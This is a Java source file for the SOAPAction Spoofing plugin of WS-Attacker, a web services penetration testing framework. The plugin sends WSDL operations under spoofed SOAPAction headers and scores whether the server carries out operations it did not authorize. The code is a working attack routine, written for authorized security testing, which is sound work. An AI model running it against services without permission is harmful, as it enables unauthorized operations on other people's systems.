/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2010 Christian Mainka
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.plugin.soapActionSpoofing;

import com.eviware.soapui.impl.wsdl.WsdlInterface;
import com.eviware.soapui.impl.wsdl.WsdlOperation;
import com.eviware.soapui.impl.wsdl.WsdlRequest;
import com.eviware.soapui.impl.wsdl.WsdlSubmit;
import com.eviware.soapui.impl.wsdl.WsdlSubmitContext;
import com.eviware.soapui.impl.wsdl.support.soap.SoapUtils;
import com.eviware.soapui.model.iface.Operation;
import com.eviware.soapui.model.iface.Request.SubmitException;
import java.beans.PropertyChangeEvent;
import java.beans.PropertyChangeListener;
import java.util.*;
import javax.xml.soap.SOAPElement;
import javax.xml.soap.SOAPException;
import javax.xml.soap.SOAPMessage;
import javax.xml.xpath.XPath;
import javax.xml.xpath.XPathConstants;
import javax.xml.xpath.XPathExpressionException;
import javax.xml.xpath.XPathFactory;
import org.apache.xmlbeans.XmlException;
import org.w3c.dom.Document;
import org.w3c.dom.Node;
import org.xml.sax.SAXException;
import wsattacker.main.composition.plugin.AbstractPlugin;
import wsattacker.main.composition.plugin.option.AbstractOption;
import wsattacker.main.composition.plugin.option.AbstractOptionBoolean;
import wsattacker.main.composition.plugin.option.AbstractOptionChoice;
import wsattacker.main.composition.plugin.option.AbstractOptionVarchar;
import wsattacker.main.composition.testsuite.RequestResponsePair;
import wsattacker.main.plugin.PluginState;
import wsattacker.main.plugin.option.OptionSimpleBoolean;
import wsattacker.main.plugin.option.OptionSimpleVarchar;
import wsattacker.main.testsuite.TestSuite;
import wsattacker.main.plugin.option.OptionSoapAction;
import wsattacker.util.SoapUtilities;
import wsattacker.util.SortedUniqueList;

public class SoapActionSpoofing
    extends AbstractPlugin
    implements PropertyChangeListener
{

    private static final long serialVersionUID = 2L;

    private static final String NAME = "SOAPAction Spoofing";

    private static final String DESCRIPTION =
        "<html><p>This attack plugin checks if the server is vulnerable to SOAPAction Spoofing.</p>"
            + "<p>In automatic mode, all SOAPAction Headers, which are present in the WSDL, are used.</p>"
            + "<p>Manual mode can be used to use only a specific operation,"
            + "e.g. a public operation which does not damage the server.</p></html>";

    private static final String AUTHOR = "Christian Mainka";

    private static final String VERSION = "1.1 / 2013-06-26";

    private static final String[] CATEGORY = new String[] { "Spoofing Attacks" };

    private static final int MAXPOINTS = 3;

    final private AbstractOptionBoolean automaticOption = new OptionSimpleBoolean( "Automatic", true,
                                                                                   "Choose SOAPAction automatically" );;

    final private AbstractOptionChoice operationChooserOption = new OptionSoapAction( "Operation",
                                                                                      "Choose action manually" );;

    final private AbstractOptionVarchar actionOption = new OptionSimpleVarchar( "Action", "", "Concrete action uri" );

    private transient WsdlRequest originalRequest, attackRequest; // for loading
                                                                  // a config,
                                                                  // only
                                                                  // options
                                                                  // are
                                                                  // important

    private String originalAction;

    final private List<AbstractOption> automaticModeOptions = new ArrayList<AbstractOption>();

    final private List<AbstractOption> manualModeOption = new ArrayList<AbstractOption>();

    @Override
    public void initializePlugin()
    {
        initData();
        initOptions();
        initInternalState();
    }

    public void initData()
    {
        setName( NAME );
        setDescription( DESCRIPTION );
        setAuthor( AUTHOR );
        setVersion( VERSION );
        setCategory( CATEGORY );
        setMaxPoints( MAXPOINTS );
    }

    private void initOptions()
    {
        // listeners:
        automaticOption.addPropertyChangeListener( this );
        operationChooserOption.addPropertyChangeListener( this );
        actionOption.addPropertyChangeListener( this );

        // The automatic options:
        automaticModeOptions.add( automaticOption );

        // The manual options:
        manualModeOption.add( automaticOption );
        manualModeOption.add( operationChooserOption );
        manualModeOption.add( actionOption );

        // Start with automatic Mode
        getPluginOptions().setOptions( automaticModeOptions );
    }

    private void initInternalState()
    {
        setState( PluginState.Ready );
        originalRequest = null;
        originalAction = null;
    }

    @Override
    public void attackImplementationHook( RequestResponsePair original )
    {
        // TODO: Add support for <wsa:action> SOAPAction Spoofing
        // save needed pointers
        originalRequest = original.getWsdlRequest();
        originalAction = originalRequest.getOperation().getAction();
        attackRequest = originalRequest.getOperation().addNewRequest( getName() + " ATTACK" );
        // create an attack request
        originalRequest.copyTo( attackRequest, true, true );

        // detect first body child
        Node originalChild;
        try
        {
            originalChild = getBodyChild( original.getWsdlResponse().getContentAsString() );
            info( "Using first SOAP Body child '" + originalChild.getNodeName() + "' as reference" );
        }
        catch ( Exception e )
        {
            log().error( "Could not detect first body child from response content. Plugin aborted \n"
                             + originalRequest.getResponse().getContentAsString() );
            setState( PluginState.Failed );
            return;
        }

        // get attacking action
        if ( automaticOption.isOn() )
        {
            info( "Automatic Mode" );
            info( "Creating attack vector" );
            List<String> attackActions = findAttackActions( originalRequest );
            int anz = attackActions.size();
            if ( anz == 0 )
            {
                info( "Could not find any suitable SOAPActions\n"
                    + "This could indicate, that the server does not use SOAPAction Header\n"
                    + "You could also choose a SOAPAction manually" );
                setState( PluginState.Failed );
            }
            else
            {

                info( "Found " + anz + " suitable SOAPActions: " + attackActions.toString() );
                trace( "Starting attack for each vector" );
                for ( String soapAction : attackActions )
                {
                    if ( getCurrentPoints() == getMaxPoints() )
                    {
                        // we can stop if we already got maximum number of
                        // points
                        info( "Stopping attack since we got the maximum number of points (" + getMaxPoints() + ")" );
                        break;
                    }
                    doAttackRequest( attackRequest, soapAction, originalChild );
                }
                setState( PluginState.Finished );
            }
        }
        else
        {
            info( "Manual Mode" );
            doAttackRequest( attackRequest, actionOption.getValueAsString(), originalChild );
        }
        // remove attack request
        originalRequest.getOperation().removeRequest( attackRequest );
        // delete references
        attackRequest = null;
        originalAction = null;
        originalRequest = null;
        switch ( getCurrentPoints() )
        {
            case 0:
                info( "(0/3) Points: No attack possible. The Web Service is not vulnerable." );
                break;
            case 1:
                important( "(1/3) Points: The server seems to have problems with the attack vectors. It should always return a SOAP Fault." );
                break;
            case 2:
                critical( "(2/3) Points: The server ignores SOAPAction Header.\n"
                    + "This can be abused to execute unauthorized operations, if authentication is controlled by HTTP." );
                break;
            case 3:
                critical( "(3/3) Points: The server executes the Operation specified by the SOAPAction Header.\n"
                    + "This can be abused to execute unauthorized operations, if authentication is controlled by the SOAP message." );
                break;
        }
    }

    @Override
    public void propertyChange( PropertyChangeEvent pce )
    {
        if ( pce.getSource() == automaticOption )
        {
            if ( automaticOption.isOn() )
            {
                log().info( "Setting automatic mode options." );
                getPluginOptions().setOptions( automaticModeOptions );
            }
            else
            {
                log().info( "Setting manual mode options." );
                getPluginOptions().setOptions( manualModeOption );
            }
        }
        else if ( pce.getSource() == operationChooserOption )
        {
            // try to get action by operationname
            try
            {
                String chosenOperationName;
                chosenOperationName = operationChooserOption.getValueAsString();
                String soapActionValue;
                soapActionValue =
                    TestSuite.getInstance().getCurrentInterface().getWsdlInterface().getOperationByName( chosenOperationName ).getAction();
                log().info( String.format( "Setting SOAPAction: %s -> %s", chosenOperationName, soapActionValue ) );
                actionOption.setValue( soapActionValue );
            }
            catch ( NullPointerException e )
            {
                actionOption.setValue( "No current Service" );
            }
            catch ( Exception e )
            {
                actionOption.setValue( "Error: " + e.getMessage() );
            }
        }
        checkState();
    }

    @Override
    public void clean()
    {
        setCurrentPoints( 0 );
        setState( PluginState.Ready );
    }

    @Override
    public void stopHook()
    {
        // restore possible data corruption
        if ( originalAction != null && originalRequest != null
            && !originalRequest.getOperation().getAction().equals( originalAction ) )
        {
            originalRequest.getOperation().setAction( originalAction );
            originalRequest = null;
            originalAction = null;
        }
        if ( attackRequest != null )
        {
            attackRequest.getOperation().removeRequest( attackRequest );
            attackRequest = null;
        }
    }

    @Override
    public boolean wasSuccessful()
    {
        // successfull only server is vulnerable for one method
        // note: one point = possible server misconfiguration
        return isFinished() && ( getCurrentPoints() > 1 );
    }

    public AbstractOptionBoolean getAutomaticOption()
    {
        return automaticOption;
    }

    public AbstractOptionChoice getOperationChooserOption()
    {
        return operationChooserOption;
    }

    public AbstractOptionVarchar getActionOption()
    {
        return actionOption;
    }

    /**
     * Gets the first child of the SOAP Body from an XML String. This Version uses XPath.
     * 
     * @param xmlContent
     * @return
     * @throws SAXException
     */
    public Node getBodyChildWithXPath( String xmlContent )
        throws SAXException
    {

        // final String SEARCH =
        // "/*[namespace::'http://www.w3.org/2003/05/soap-envelope']";
        String SEARCH = "/Envelope/Body/*[1]";
        Document doc = SoapUtilities.stringToDom( xmlContent );
        XPath xpath = XPathFactory.newInstance().newXPath();
        Node node = null;
        try
        {
            node = (Node) xpath.evaluate( SEARCH, doc, XPathConstants.NODE );
        }
        catch ( XPathExpressionException e )
        {
            log().warn( e );
        }
        return node;
    }

    /**
     * Gets the first child of the SOAP Body from an XML String. This does exactly the same as getBodyChildWithXPath but
     * it demonstrates the power of WS-Attackers SoapUtilities.
     * 
     * @param xmlContent
     * @return
     * @throws SOAPException
     */
    public Node getBodyChild( String xmlContent )
        throws SOAPException
    {
        Node result = null;
        SOAPMessage sm = SoapUtilities.stringToSoap( xmlContent );
        // we need to return the first soapChild because there could also
        // be a TextNode (whitespaces) as sm.getSOAPBody().getFirstChild()
        List<SOAPElement> bodyChilds = SoapUtilities.getSoapChilds( sm.getSOAPBody() );
        if ( bodyChilds.size() > 0 )
        {
            result = bodyChilds.get( 0 );
        }
        return result;
    }

    @Override
    public void restoreConfiguration( AbstractPlugin plugin )
    {
        if ( plugin instanceof SoapActionSpoofing )
        {
            SoapActionSpoofing old = (SoapActionSpoofing) plugin;
            // try to restore chooser
            actionOption.setValue( old.getActionOption().getValue() );
            operationChooserOption.setSelectedAsString( old.getOperationChooserOption().getValueAsString() );
            // restore automatic mode
            automaticOption.setOn( old.getAutomaticOption().isOn() );
        }
    }

    private void doAttackRequest( WsdlRequest request, String soapAction, Node originalChild )
    {
        // set SOAPAction
        info( "Using SOAPAction Header '" + soapAction + "'" );
        request.getOperation().setAction( soapAction );

        try
        {
            WsdlSubmit<WsdlRequest> submit = request.submit( new WsdlSubmitContext( request ), false );
            String responseContent = submit.getResponse().getContentAsString();
            if ( responseContent == null )
            {
                important( "The server's answer was empty. Server misconfiguration?\n" + "Got 1/3 Points" );
                setCurrentPoints( 1 );
                return;
            }
            trace( "Request:\n" + submit.getRequest().getRequestContent() + "\n\nResponse:\n" + responseContent );
            try
            {
                if ( SoapUtils.isSoapFault( responseContent, request.getOperation().getInterface().getSoapVersion() ) )
                {
                    info( "No attack possible, you got a SOAP error message." );
                    // exit
                    return;
                }
            }
            catch ( XmlException e )
            {
                info( "The answer is not valid XML. Server missconfiguration?" );
                setCurrentPoints( 1 );
            }
            // determine which operation corresponds to the response
            Node responseChild;
            try
            {
                responseChild = getBodyChild( responseContent );
                if ( responseChild == null )
                {
                    important( "There is no Child in the SOAP Body. Misconfigured Server?\n" + "Got 1/3 Points." );
                    setCurrentPoints( 1 );
                    return;
                }
                info( "Detected first body child: '" + responseChild.getNodeName() + "'" );
                // this is for using getBodyChildWithXPath()
                // } catch (SAXException e) {
                // warn("Could not detect first body child from response content. Attack aborted \n"
                // + responseContent);
                // return;
            }
            catch ( SOAPException e )
            {
                info( "Could not parse response. " + e.getMessage() );
                return;
            }
            if ( responseChild.getNodeName().equals( originalChild.getNodeName() ) )
            {
                important( "The server ignored the SOAPAction Header. It still executes the first child of the Body.\n"
                    + "Got 2/3 Points" );
                setCurrentPoints( 2 );
            }
            else
            {
                important( "The server accepts the SOAPAction Header " + soapAction
                    + " and executes the corresponding operation.\n" + "Got 3/3 Points" );
                setCurrentPoints( 3 );
            }
        }
        catch ( SubmitException e )
        {
            info( "Could not submit the request. " + e.getMessage() );
        }
        finally
        {
            request.getOperation().setAction( originalAction );
        }
    }

    private void checkState()
    {
        if ( automaticOption.isOn() )
        {
            setState( PluginState.Ready );
        }
        else
        {
            if ( operationChooserOption.getSelectedIndex() > 0 )
            {
                setState( PluginState.Ready );
            }
        }
    }

    private List<String> findAttackActions( WsdlRequest request )
    {
        List<String> ret = new SortedUniqueList<String>();
        // Get the responding interface
        WsdlInterface iface = request.getOperation().getInterface();
        // loop through all available operations
        for ( Operation op : iface.getOperationList() )
        {
            if ( op instanceof WsdlOperation )
            {
                // add action to return list
                String action = ( (WsdlOperation) op ).getAction();
                ret.add( action );
            }
        }
        // remove current request action, since this action can not
        // be used for SOAPAction Spoofing
        ret.remove( request.getOperation().getAction() );
        return ret;
    }
}
